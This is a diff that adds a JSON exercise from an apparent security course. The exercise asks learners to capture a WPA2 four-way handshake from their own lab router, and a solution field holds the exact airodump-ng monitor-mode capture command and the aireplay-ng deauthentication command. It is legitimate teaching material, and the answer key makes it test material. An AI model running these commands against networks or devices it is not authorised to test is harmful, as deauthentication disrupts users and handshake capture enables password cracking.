@@ -1,0 +1,15 @@
+{
+    "id": "task2",
+    "chapterId": "ch_9",
+    "title": "Capture a WPA2 Handshake",
+    "description": "Use airodump-ng and aireplay-ng to capture a 4-Way Handshake from your lab router.",
+    "estimatedMinutes": 30,
+    "problemStatement": "# Objective\nCapture a WPA2 4-Way Handshake from your own lab Wi-Fi network.\n\n## Setup\n- You must have a **test Wi-Fi router** that you own.\n- Connect a test device (e.g., an old smartphone or laptop) to this Wi-Fi.\n\n## Steps\n1.  Enable monitor mode on your adapter.\n2.  Run `airodump-ng wlan0mon` to scan for networks. Note the **BSSID**, **Channel**, and **ESSID** of your test router.\n3.  Start a targeted capture:\n    ```bash\n    sudo airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon\n    ```\n4.  In a **second terminal**, send deauthentication packets to your connected test device to force a reconnection:\n    ```bash\n    sudo aireplay-ng -0 5 -a [BSSID] -c [Client_MAC] wlan0mon\n    ```\n5.  Watch the first terminal. You should see `WPA handshake: [BSSID]` appear in the top right.\n6.  Stop the capture with `Ctrl+C`. You now have a `capture-01.cap` file.\n\n## Deliverable\nScreenshot showing the `WPA handshake` confirmation in the airodump-ng output.",
+    "hints": [
+        "The client MAC address appears in the bottom section of the airodump-ng window.",
+        "If no client appears, try turning your test device's Wi-Fi off and on again.",
+        "Ensure you are close to the router for a strong signal."
+    ],
+    "expectedOutput": "`capture-01.cap` file containing a valid handshake.",
+    "solutionCode": "# Terminal 1\nsudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon\n\n# Terminal 2 (once client appears)\nsudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon"
+}
